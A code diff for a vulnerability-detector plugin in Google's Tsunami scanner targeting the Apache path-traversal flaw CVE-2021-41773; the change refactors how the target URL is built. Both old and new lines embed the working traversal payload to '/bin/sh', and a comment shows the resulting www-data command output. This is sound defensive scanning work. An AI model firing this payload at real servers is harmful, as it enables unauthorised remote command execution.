@@ -17,12 +17,12 @@ package com.google.tsunami.plugins.detectors.rce.cve202141773;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
-import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
 
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
 import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
+import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
 import com.google.tsunami.common.net.http.HttpRequest;
 import com.google.tsunami.common.net.http.HttpResponse;
@@ -109,10 +109,8 @@ public final class Cve202141773DetectorWithPayload implements VulnDetector {
     // "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
     // --> uid=33(www-data) gid=33(www-data) groups=33(www-data)
     String targetUri =
-        String.format(
-            "http://%s%s",
-            toUriAuthority(networkService.getNetworkEndpoint()),
-            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh");
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
+            + "cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh";
 
     String postData =
       String.format(
